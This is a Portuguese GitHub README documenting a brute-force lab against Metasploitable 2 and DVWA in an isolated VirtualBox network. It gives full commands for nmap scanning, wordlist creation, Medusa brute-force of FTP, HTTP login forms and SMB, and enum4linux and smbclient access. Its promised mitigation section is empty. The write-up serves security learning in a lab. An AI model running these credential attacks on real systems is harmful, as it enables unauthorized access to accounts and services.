# 🔍 Auditoria de Segurança com Medusa - Laboratório de Força Bruta (Kali + Metasploitable 2 + DVWA)
O objetivo deste projeto foi compreender as técnicas ofensivas e refletir sobre mitigação e boas práticas de segurança nos sistemas. Para isso, foi realizado, antes de tudo, a configuração de um ambiente controlado usando Kali Linux e Metasploitable 2, com foco na execução de ataques de força bruta utilizando a ferramenta Medusa.

<br>

# 1 - 🛠️ Ambiente Utilizado:
* VM Usada: VirtualBox;
* SOs usadas: Kali Linux(Atacante) e Metasploitable 2(Alvo);
* Explorações: FTP, DVWA, SMB;
* Ferramentas Para a Exploração: Nmap, Medusa, SMBClient;
* Configurando a placa de rede dentro da VM como: "Host-Only", tanto do Kali Linux quanto do Metaspoitable 2. <br>
        └── Isso garante que o ataque não saia para a internet real.

<br>

## 2 - 📝 Verificações Iniciais:
- Verificação de ping entre os dois SOs; <br>
      └── Verifica se ambos estão se comunicando.

- Digite o comando no metasploitable 2 para saber o ip e realizar a verificação do mesmo (Faça isso após entrar com o login e senha do metasploitable 2):
  ``` bash
  ip a
  ```
- Após isso, anote o Inet e teste no Kali Linux.
  ``` bash
  ping -c 3 coloque o IP
   ```
  
- Criação de listas(Wordlists) no Kali Linux para a realização dos testes de força bruta; <br>
      └── Criou? Deu certo? Então está tudo ok. Deu erro e não criou? Reinicie o Kali antes de aplicar qualquer outro comando de verificação (Comigo funcionou).
      
<br>

## 🚪 Cenário de Ataque no Protocolo FTP:
 * **Etapa 1:** Escanear possiveis portas abertas e o tipo de serviço:
   ```bash
   nmap -sV -p 21,22,80,445,139 coloque o IP
   ```
  <img width="1029" height="553" alt="image" src="https://github.com/user-attachments/assets/a6544b03-ac68-4690-962d-9654814ada3a" />
  
  * **Resultado da análise:** Acesso bem `sucedido` ✔

<br>

* **Etapa 2:** Quebrando senhas com a ferramenta Medusa: Faça a criação de arquivos com possíveis nomes de usuários e senhas:
 ```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```
 <img width="1179" height="555" alt="image" src="https://github.com/user-attachments/assets/5a336aa4-5ce3-4112-b86f-c1d37de474d4" />
 
 * **Resultado da exploração:** Usuário e Login encontrados com sucesso ✔

## 📑 Cenários de Ataques em Formulários de Login:
* **Etapa 3:** Entrar no site: DVWA
```bash
192.168.56.102/dvwa/login.php
```
**3.1 - Criar wordlists para usuários e senhas;**

**3.2 - Rodar o seguinte comando:**
```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE: '/dvwa/login.php' \
-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```
<img width="1251" height="607" alt="image" src="https://github.com/user-attachments/assets/2068f786-ab68-4490-82f5-79932d1fc090" />

- **Resumo:** O comando faz brute force no login do DVWA via HTTP, usando listas de usuários e senhas, enviando requisições do tipo POST, identificando falhas pelo texto “Login failed” e executando tudo em 6 tentativas acontecendo ao mesmo tempo.

## 💻 Cenários de Ataques SMB:
* **Etapa 4:** Enumerar informações de sistemas Windows ou serviços SMB/Samba.
```bash
enum4linux -a 192.168.56.102 | tee enum4_output.txt
```
* **Resultado da análise:** Acesso a listas de usuários, compartilhamentos disponiveis e até nome de dominio ✔

* **Etapa 4.1:** Ataque ao SMB com a medusa
```bash
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 
```
* **Etapa 4.1:** Acesso ao servidor SMB:
```bash
smbclient -L //192.168.56.102 -U msfadmin
```
<img width="1153" height="548" alt="image" src="https://github.com/user-attachments/assets/88750cfd-fca7-4dae-87d2-2acc93335eaf" />

* **Resultado Final:** Acesso bem `sucedido` ✔
  
![](https://i.imgur.com/WTLoFrq.png)

## 🔒🛡️ Para Concluir: Listarei Algumas Medidas de Mitigação
- 

## 🔗 Compartilhe com a comunidade 🧡

Por favor, se esse conteúdo te ajudou, compartilhe.

[![GitHub Repo stars](https://img.shields.io/badge/share%20on-twitter-03A9F4?logo=twitter)](https://github.com/Luhrodrigues45/Auditoria-de-forca-bruta) [![GitHub Repo stars](https://img.shields.io/badge/share%20on-facebook-1976D2?logo=facebook)](https://github.com/Luhrodrigues45/Auditoria-de-forca-bruta) [![GitHub Repo stars](https://img.shields.io/badge/share%20on-linkedin-3949AB?logo=linkedin)](https://github.com/Luhrodrigues45/Auditoria-de-forca-bruta)
